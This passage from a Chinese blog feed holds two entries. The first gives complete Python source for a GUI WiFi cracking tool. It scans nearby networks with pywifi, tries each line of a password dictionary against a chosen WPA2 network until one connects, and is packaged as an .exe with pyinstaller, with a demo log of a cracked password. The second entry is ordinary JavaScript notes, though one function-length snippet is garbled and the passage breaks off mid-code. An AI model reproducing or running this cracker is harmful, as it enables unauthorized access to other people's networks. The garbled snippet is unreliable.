class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> ttk</span><br><span class="line"><span class="keyword">import</span> pywifi</span><br><span class="line"><span class="keyword">from</span> pywifi <span class="keyword">import</span> const</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> tkinter.filedialog  <span class="comment"># 在Gui中打开文件浏览</span></span><br><span class="line"><span class="keyword">import</span> tkinter.messagebox  <span class="comment"># 打开tkiner的消息提醒框</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MY_GUI</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, init_window_name</span>):</span><br><span class="line">        self.init_window_name = init_window_name</span><br><span class="line">        <span class="comment"># 密码文件路径</span></span><br><span class="line">        self.get_value = StringVar()  <span class="comment"># 设置可变内容</span></span><br><span class="line">        <span class="comment"># 获取破解wifi账号</span></span><br><span class="line">        self.get_wifi_value = StringVar()</span><br><span class="line">        <span class="comment"># 获取wifi密码</span></span><br><span class="line">        self.get_wifimm_value = StringVar()</span><br><span class="line">        <span class="comment"># 抓取网卡接口</span></span><br><span class="line">        self.wifi = pywifi.PyWiFi()</span><br><span class="line">        <span class="comment"># 抓取第一个无线网卡</span></span><br><span class="line">        self.iface = self.wifi.interfaces()[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># 测试链接断开所有链接</span></span><br><span class="line">        self.iface.disconnect()</span><br><span class="line">        time.sleep(<span class="number">1</span>)  <span class="comment"># 休眠1秒</span></span><br><span class="line">        <span class="comment"># 测试网卡是否属于断开状态</span></span><br><span class="line">        <span class="keyword">assert</span> self.iface.status() <span class="keyword">in</span> \</span><br><span class="line">               [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 自动会调用的函数，返回自身的网卡</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;(WIFI:%s,%s)&#x27;</span> % (self.wifi, self.iface.name())</span><br><span class="line">    <span class="comment"># 设置窗口</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_init_window</span>(<span class="params">self</span>):</span><br><span class="line">        self.init_window_name.title(<span class="string">&quot;普帝WIFI破解工具&quot;</span>)</span><br><span class="line">        self.init_window_name.geometry(<span class="string">&#x27;+500+200&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        labelframe = LabelFrame(width=<span class="number">800</span>, height=<span class="number">400</span>, text=<span class="string">&quot;配置&quot;</span>)  <span class="comment"># 框架，以下对象都是对于labelframe中添加的</span></span><br><span class="line">        labelframe.grid(column=<span class="number">0</span>, row=<span class="number">0</span>, padx=<span class="number">10</span>, pady=<span class="number">10</span>)</span><br><span class="line">        self.search = Button(labelframe, text=<span class="string">&quot;搜索附近WiFi&quot;</span>, command=self.scans_wifi_list).grid(column=<span class="number">0</span>, row=<span class="number">0</span>)</span><br><span class="line">        self.pojie = Button(labelframe, text=<span class="string">&quot;普帝金手指&quot;</span>, command=self.readPassWord).grid(column=<span class="number">1</span>, row=<span class="number">0</span>)</span><br><span class="line">        self.label = Label(labelframe, text=<span class="string">&quot;目录路径：&quot;</span>).grid(column=<span class="number">0</span>, row=<span class="number">1</span>)</span><br><span class="line">        self.path = Entry(labelframe, width=<span class="number">12</span>, textvariable=self.get_value).grid(column=<span class="number">1</span>, row=<span class="number">1</span>)</span><br><span class="line">        self.file = Button(labelframe, text=<span class="string">&quot;添加密码文件目录&quot;</span>, command=self.add_mm_file).grid(column=<span class="number">2</span>, row=<span class="number">1</span>)</span><br><span class="line">        self.wifi_text = Label(labelframe, text=<span class="string">&quot;WiFi账号：&quot;</span>).grid(column=<span class="number">0</span>, row=<span class="number">2</span>)</span><br><span class="line">        self.wifi_input = Entry(labelframe, width=<span class="number">12</span>, textvariable=self.get_wifi_value).grid(column=<span class="number">1</span>, row=<span class="number">2</span>)</span><br><span class="line">        self.wifi_mm_text = Label(labelframe, text=<span class="string">&quot;WiFi密码：&quot;</span>).grid(column=<span class="number">2</span>, row=<span class="number">2</span>)</span><br><span class="line">        self.wifi_mm_input = Entry(labelframe, width=<span class="number">10</span>, textvariable=self.get_wifimm_value).grid(column=<span class="number">3</span>, row=<span class="number">2</span>,sticky=W)</span><br><span class="line">        self.wifi_labelframe = LabelFrame(text=<span class="string">&quot;wifi列表&quot;</span>)</span><br><span class="line">        self.wifi_labelframe.grid(column=<span class="number">0</span>, row=<span class="number">3</span>, columnspan=<span class="number">4</span>, sticky=NSEW)</span><br><span class="line">        <span class="comment"># 定义树形结构与滚动条</span></span><br><span class="line">        self.wifi_tree = ttk.Treeview(self.wifi_labelframe, show=<span class="string">&quot;headings&quot;</span>, columns=(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>))</span><br><span class="line">        self.vbar = ttk.Scrollbar(self.wifi_labelframe, orient=VERTICAL, command=self.wifi_tree.yview)</span><br><span class="line">        self.wifi_tree.configure(yscrollcommand=self.vbar.<span class="built_in">set</span>)</span><br><span class="line">        <span class="comment"># 表格的标题</span></span><br><span class="line">        self.wifi_tree.column(<span class="string">&quot;a&quot;</span>, width=<span class="number">50</span>, anchor=<span class="string">&quot;center&quot;</span>)</span><br><span class="line">        self.wifi_tree.column(<span class="string">&quot;b&quot;</span>, width=<span class="number">100</span>, anchor=<span class="string">&quot;center&quot;</span>)</span><br><span class="line">        self.wifi_tree.column(<span class="string">&quot;c&quot;</span>, width=<span class="number">100</span>, anchor=<span class="string">&quot;center&quot;</span>)</span><br><span class="line">        self.wifi_tree.column(<span class="string">&quot;d&quot;</span>, width=<span class="number">100</span>, anchor=<span class="string">&quot;center&quot;</span>)</span><br><span class="line">        self.wifi_tree.heading(<span class="string">&quot;a&quot;</span>, text=<span class="string">&quot;WiFiID&quot;</span>)</span><br><span class="line">        self.wifi_tree.heading(<span class="string">&quot;b&quot;</span>, text=<span class="string">&quot;SSID&quot;</span>)</span><br><span class="line">        self.wifi_tree.heading(<span class="string">&quot;c&quot;</span>, text=<span class="string">&quot;BSSID&quot;</span>)</span><br><span class="line">        self.wifi_tree.heading(<span class="string">&quot;d&quot;</span>, text=<span class="string">&quot;signal&quot;</span>)</span><br><span class="line">        self.wifi_tree.grid(row=<span class="number">4</span>, column=<span class="number">0</span>, sticky=NSEW)</span><br><span class="line">        self.wifi_tree.bind(<span class="string">&quot;&lt;Double-1&gt;&quot;</span>, self.onDBClick)</span><br><span class="line">        self.vbar.grid(row=<span class="number">4</span>, column=<span class="number">1</span>, sticky=NS)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 搜索wifi</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">scans_wifi_list</span>(<span class="params">self</span>):  <span class="comment"># 扫描周围wifi列表</span></span><br><span class="line">        <span class="comment"># 开始扫描</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;^_^ 开始扫描附近wifi...&quot;</span>)</span><br><span class="line">        self.iface.scan()</span><br><span class="line">        time.sleep(<span class="number">15</span>)</span><br><span class="line">        <span class="comment"># 在若干秒后获取扫描结果</span></span><br><span class="line">        scanres = self.iface.scan_results()</span><br><span class="line">        <span class="comment"># 统计附近被发现的热点数量</span></span><br><span class="line">        nums = <span class="built_in">len</span>(scanres)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;数量: %s&quot;</span> % (nums))</span><br><span class="line">        <span class="comment"># 实际数据</span></span><br><span class="line">        self.show_scans_wifi_list(scanres)</span><br><span class="line">        <span class="keyword">return</span> scanres</span><br><span class="line">    <span class="comment"># 显示wifi列表</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show_scans_wifi_list</span>(<span class="params">self, scans_res</span>):</span><br><span class="line">        <span class="keyword">for</span> index, wifi_info <span class="keyword">in</span> <span class="built_in">enumerate</span>(scans_res):</span><br><span class="line">            self.wifi_tree.insert(<span class="string">&quot;&quot;</span>, <span class="string">&#x27;end&#x27;</span>, values=(index + <span class="number">1</span>, wifi_info.ssid, wifi_info.bssid, wifi_info.signal))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 添加密码文件目录</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_mm_file</span>(<span class="params">self</span>):</span><br><span class="line">        self.filename = tkinter.filedialog.askopenfilename()</span><br><span class="line">        self.get_value.<span class="built_in">set</span>(self.filename)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Treeview绑定事件</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">onDBClick</span>(<span class="params">self, event</span>):</span><br><span class="line">        self.sels = event.widget.selection()</span><br><span class="line">        self.get_wifi_value.<span class="built_in">set</span>(self.wifi_tree.item(self.sels, <span class="string">&quot;values&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">    <span class="comment"># 读取密码字典，进行匹配</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">readPassWord</span>(<span class="params">self</span>):</span><br><span class="line">        self.getFilePath = self.get_value.get()</span><br><span class="line">        self.get_wifissid = self.get_wifi_value.get()</span><br><span class="line">        pwdfilehander = <span class="built_in">open</span>(self.getFilePath, <span class="string">&quot;r&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.pwdStr = pwdfilehander.readline()</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> self.pwdStr:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                self.bool1 = self.connect(self.pwdStr, self.get_wifissid)</span><br><span class="line">                <span class="keyword">if</span> self.bool1:</span><br><span class="line">                    self.res = <span class="string">&quot;[*] 密码正确！wifi名：%s，匹配密码：%s &quot;</span> % (self.get_wifissid, self.pwdStr)</span><br><span class="line">                    self.get_wifimm_value.<span class="built_in">set</span>(self.pwdStr)</span><br><span class="line">                    tkinter.messagebox.showinfo(<span class="string">&#x27;提示&#x27;</span>, <span class="string">&#x27;破解成功！！！&#x27;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(self.res)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.res = <span class="string">&quot;[*] 密码错误！wifi名:%s，匹配密码：%s&quot;</span> % (self.get_wifissid, self.pwdStr)</span><br><span class="line">                    <span class="built_in">print</span>(self.res)</span><br><span class="line">                time.sleep(<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对wifi和密码进行匹配</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">connect</span>(<span class="params">self, pwd_Str, wifi_ssid</span>):</span><br><span class="line">        <span class="comment"># 创建wifi链接文件</span></span><br><span class="line">        self.profile = pywifi.Profile()</span><br><span class="line">        self.profile.ssid = wifi_ssid  <span class="comment"># wifi名称</span></span><br><span class="line">        self.profile.auth = const.AUTH_ALG_OPEN  <span class="comment"># 网卡的开放</span></span><br><span class="line">        self.profile.akm.append(const.AKM_TYPE_WPA2PSK)  <span class="comment"># wifi加密算法</span></span><br><span class="line">        self.profile.cipher = const.CIPHER_TYPE_CCMP  <span class="comment"># 加密单元</span></span><br><span class="line">        self.profile.key = pwd_Str  <span class="comment"># 密码</span></span><br><span class="line">        self.iface.remove_all_network_profiles()  <span class="comment"># 删除所有的wifi文件</span></span><br><span class="line">        self.tmp_profile = self.iface.add_network_profile(self.profile)  <span class="comment"># 设定新的链接文件</span></span><br><span class="line">        self.iface.connect(self.tmp_profile)  <span class="comment"># 链接</span></span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> self.iface.status() == const.IFACE_CONNECTED:  <span class="comment"># 判断是否连接上</span></span><br><span class="line">            isOK = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            isOK = <span class="literal">False</span></span><br><span class="line">        self.iface.disconnect()  <span class="comment"># 断开</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># 检查断开状态</span></span><br><span class="line">        <span class="keyword">assert</span> self.iface.status() <span class="keyword">in</span> \</span><br><span class="line">               [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]</span><br><span class="line">        <span class="keyword">return</span> isOK</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gui_start</span>():</span><br><span class="line">    init_window = Tk()</span><br><span class="line">    ui = MY_GUI(init_window)</span><br><span class="line">    <span class="built_in">print</span>(ui)</span><br><span class="line">    ui.set_init_window()</span><br><span class="line">    init_window.mainloop()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    gui_start()</span><br></pre></td></tr></table></figure><h2 id="打包成-exe"><a href="#打包成-exe" class="headerlink" title="打包成 exe"></a>打包成 exe</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller -F -w -i 图标名.后缀 源文件.py</span><br></pre></td></tr></table></figure><p>命令解释看文末解释<br><img scr="https://img-blog.csdnimg.cn/b16c2fad86844dabbd3d1a6f042c252e.png"><br>然后到你电脑上 python 安装目录下的 Scripts\dist 查看你打包的 exe 应用<br><img src="https://img-blog.csdnimg.cn/e2337659b683423886b1a0cfc1523d6c.png#pic_center"></p><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>双击打包后的.exe 脚本<br><img src="https://img-blog.csdnimg.cn/490709a88df0471eb39b56207d6eb868.png#pic_center"></p><ul><li>STEP1: 点击搜索附件 WIFI</li><li>STEP2: 添加密码文件目录</li><li>STEP3: 点击普帝金手指进行破解<img src="https://img-blog.csdnimg.cn/40e2ff74610b459fb618e023e5f90f41.png#pic_center"></li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">^_^ 开始扫描附近wifi...</span><br><span class="line">数量: <span class="number">19</span></span><br><span class="line">[*] 密码正确！wifi名：XXXXXXXX，匹配密码：XXXXXXXX</span><br></pre></td></tr></table></figure><h2 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h2><p><a href="https://so.csdn.net/so/search?q=pyinstaller&spm=1001.2101.3001.7020">pyinstaller</a>打包错误解决<br>如出现以下错误<br>struct.error: unpack requires a buffer of 16 bytes<br><img src="https://img-blog.csdnimg.cn/210e8b6ee4d24ccba4c54afb6fee853e.png#pic_center"><br>解决方法：使用在线转换 ico 工具来转换图片就可以了，需要转换成尺寸为 16*16 的<br>使用在线转换成 ico 的工具即可</p><h2 id="pyintaller-常用打包命令解释"><a href="#pyintaller-常用打包命令解释" class="headerlink" title="pyintaller 常用打包命令解释"></a>pyintaller 常用打包命令解释</h2><img src="https://img-blog.csdnimg.cn/cc0af9ad090e47958cf02d4746298bfe.png">]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript实用知识</title>
      <link href="/archives/d9e63583.html"/>
      <url>/archives/d9e63583.html</url>
      
        <content type="html"><![CDATA[<h2 id="JavaScript-数组的常用方法"><a href="#JavaScript-数组的常用方法" class="headerlink" title="JavaScript 数组的常用方法"></a>JavaScript 数组的常用方法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 增</span></span><br><span class="line"><span class="title function_">push</span>()、<span class="title function_">unshift</span>()、<span class="title function_">splice</span>()、<span class="title function_">concat</span>()</span><br><span class="line"><span class="comment">// 删</span></span><br><span class="line"><span class="title function_">pop</span>()、<span class="title function_">shift</span>()、<span class="title function_">splice</span>()、<span class="title function_">slice</span>()</span><br><span class="line"><span class="comment">// 改</span></span><br><span class="line"><span class="title function_">splice</span>()</span><br><span class="line"><span class="comment">// 查</span></span><br><span class="line"><span class="title function_">indexOf</span>()、<span class="title function_">includes</span>()、<span class="title function_">find</span>()</span><br><span class="line"><span class="comment">// 排序方法</span></span><br><span class="line"><span class="title function_">reverse</span>()、<span class="title function_">sort</span>()</span><br><span class="line"><span class="comment">// 转换方法</span></span><br><span class="line"><span class="title function_">join</span>()</span><br><span class="line"><span class="comment">// 迭代方法（都不改变原数组）</span></span><br><span class="line"><span class="title function_">some</span>()、<span class="title function_">every</span>()、<span class="title function_">forEach</span>()、<span class="title function_">filter</span>()、<span class="title function_">map</span>()</span><br><span class="line"><span class="comment">// 构造函数</span></span><br><span class="line"><span class="title class_">Array</span>.<span class="title function_">from</span>()、<span class="title class_">Array</span>.<span class="title function_">of</span>()、<span class="title class_">Array</span>()</span><br></pre></td></tr></table></figure><h2 id="JavaScript-字符串的常用方法"><a href="#JavaScript-字符串的常用方法" class="headerlink" title="JavaScript 字符串的常用方法"></a>JavaScript 字符串的常用方法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 增</span></span><br><span class="line">+、$&#123;&#125;、<span class="title function_">concat</span>()</span><br><span class="line"><span class="comment">// 删</span></span><br><span class="line"><span class="title function_">slice</span>()、<span class="title function_">substr</span>()、<span class="title function_">substring</span>()</span><br><span class="line"><span class="comment">// 改</span></span><br><span class="line"><span class="title function_">trim</span>()、<span class="title function_">trimLeft</span>()、<span class="title function_">trimRight</span>()、<span class="title function_">repeat</span>()、<span class="title function_">padStart</span>()、<span class="title function_">padEnd</span>()、<span class="title function_">toLowerCase</span>()、 <span class="title function_">toUpperCase</span>()</span><br><span class="line"><span class="comment">// 查</span></span><br><span class="line"><span class="title function_">chatAt</span>()、<span class="title function_">indexOf</span>()、<span class="title function_">startWith</span>()、<span class="title function_">includes</span>()</span><br><span class="line"><span class="comment">// 转换方法</span></span><br><span class="line"><span class="title function_">split</span>()</span><br><span class="line"><span class="comment">// 模板匹配方法，针对正则表达式设计</span></span><br><span class="line"><span class="title function_">match</span>()、<span class="title function_">search</span>()、<span class="title function_">replace</span>()</span><br></pre></td></tr></table></figure><h2 id="JavaScript-对象的常用方法"><a href="#JavaScript-对象的常用方法" class="headerlink" title="JavaScript 对象的常用方法"></a>JavaScript 对象的常用方法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 合并</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>()</span><br><span class="line"><span class="comment">// 遍历</span></span><br><span class="line">键名：<span class="title class_">Object</span>.<span class="title function_">keys</span>()、键值：<span class="title class_">Object</span>.<span class="title function_">values</span>()、键值对：<span class="title class_">Object</span>.<span class="title function_">entries</span>()</span><br><span class="line"><span class="comment">// 原型</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">setPrototypeOf</span>()、<span class="title class_">Object</span>.<span class="title function_">getPrototypeOf</span>()</span><br></pre></td></tr></table></figure><h2 id="JavaScript-函数的扩展"><a href="#JavaScript-函数的扩展" class="headerlink" title="JavaScript 函数的扩展"></a>JavaScript 函数的扩展</h2><ul><li>参数：<code>ES6</code> 允许为函数的参数设置默认值。</li><li>属性：<code>length</code> 属性 – <code>length</code> 将返回没有指定默认值的参数个数（<code>rest</code> 参数也不会计入 <code>length</code> 属性；设置了默认值的参数不是尾参数，那么 <code>length</code> 属性也不再计入后面的参数了）；<code>name</code> 属性 – 返回该函数的函数名。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">;(<span class="keyword">function</span> (<span class="params">a</span>) &#123;&#125;</span><br><span class="line">  .<span class="title function_">length</span>(</span><br><span class="line">    <span class="comment">// 1</span></span><br><span class="line">    <span class="keyword">function</span> (<span class="params">a = <span class="number">5</span></span>) &#123;&#125;</span><br><span class="line">  )</span><br><span class="line">  .<span class="title function_">length</span>(</span><br><span class="line">    <span class="comment">// 0</span></span><br><span class="line">    <span class="keyword">function</span> (<span class="params">a, b, c = <span class="number">5</span></span>) &#123;&#125;</span><br><span class="line">  )</span><br><span class="line">  .<span class="title function_">length</span>(</span><br><span class="line">    <span class="comment">// 2</span></span><br><span class="line">    <span class="keyword">function</span> (<span class="params">...args</span>) &#123;&#125;</span><br><span class="line">  )</span><br><span class="line">  .<span class="title function_">length</span>(</span><br><span class="line">    <span class="comment">// 0</span></span><br><span class="line">    <span class="keyword">function</span> (<span class="params">a, b = <span class="number">1</span>, c</span>) &#123;&#125;</span><br><span class="line">  ).<span class="property">length</span>) <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><h2 id="x3D-x3D-和-x3D-x3D-x3D-的区别"><a href="#x3D-x3D-和-x3D-x3D-x3D-的区别" class="headerlink" title="&#x3D;&#x3D; 和 &#x3D;&#x3D;&#x3D; 的区别"></a>&#x3D;&#x3D; 和 &#x3D;&#x3D;&#x3D; 的区别</h2><ul><li>等于操作符 &#x3D;&#x3D;：操作数相等，则会返回 <code>true</code>；存在隐式转换，在比较中会先进行<strong>类型转换</strong>，再确定操作数是否相等。</li><li>全等操作符 &#x3D;&#x3D;&#x3D;：只有两个操作数在不转换的前提下相等才返回 <code>true</code>，即类型相同，值也需相同。</li></ul><blockquote><p>总结：</p><ul><li>两个都为简单类型，字符串和布尔值都会转换成数值，再比较；</li><li>简单类型与引用类型比较，对象转化成其原始类型的值，再比较；</li><li>两个都为引用类型，则比较它们是否指向同一个对象；</li><li>null 和 undefined 相等；</li><li>存在 NaN 则返回 false。</li></ul></blockquote><h2 id="new-操作符具体都干了什么"><a href="#new-操作符具体都干了什么" class="headerlink" title="new 操作符具体都干了什么"></a>new 操作符具体都干了什么</h2><ul><li>在 <code>JavaScript</code> 中，<code>new</code> 操作符用于创建一个给定构造函数的实例对象。</li><li>流程：【1】创建一个新的对象 <code>obj</code>；【2】将对象与构造函数通过原型链连接起来；【3】将构造函数中的 <code>this</code> 绑定到新建的对象 <code>obj</code> 上；【4】根据构造函数返回类型作判断，如果是原始值则被忽略，如果是返回对象，需要正常处理（需要特别注意一下，下面有对比例子）。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 构造函数返回值是基本数据类型</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Test</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> t = <span class="keyword">new</span> <span class="title class_">Test</span>(<span class="string">&#x27;xxx&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(t.<span class="property">name</span>) <span class="comment">// &#x27;xxx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造函数返回值是对象</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Test</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>) <span class="comment">// Test &#123; name: &#x27;xxx&#x27; &#125;</span></span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">age</span>: <span class="number">26</span> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> t = <span class="keyword">new</span> <span class="title class_">Test</span>(<span class="string">&#x27;xxx&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(t) <span class="comment">// &#123; age: 26 &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(t.<span class="property">name</span>) <span class="comment">// &#x27;undefined&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>手写 new 的执行过程：</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">mynew</span>(<span class="params">Func, ...args</span>) &#123;</span><br><span class="line">  <span class="comment">// 1.创建一个新对象</span></span><br><span class="line">  <span class="keyword">const</span> obj = &#123;&#125;</span><br><span class="line">  <span class="comment">// 2.新对象原型指向构造函数原型对象</span></span><br><span class="line">  obj.<span class="property">__proto__</span> = <span class="title class_">Func</span>.<span class="property"><span class="keyword">prototype</span></span></span><br><span class="line">  <span class="comment">// 3.将构建函数的this指向新对象</span></span><br><span class="line">  <span class="keyword">let</span> result = <span class="title class_">Func</span>.<span class="title function_">apply</span>(obj, args)</span><br><span class="line">  <span class="comment">// 4.根据返回值判断</span></span><br><span class="line">  <span class="keyword">return</span> result <span class="keyword">instanceof</span> <span class="title class_">Object</span> ? result : obj</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name, age</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">age</span> = age</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">say</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> p = <span class="title function_">mynew</span>(<span class="title class_">Person</span>, <span class="string">&#x27;huihui&#x27;</span>, <span 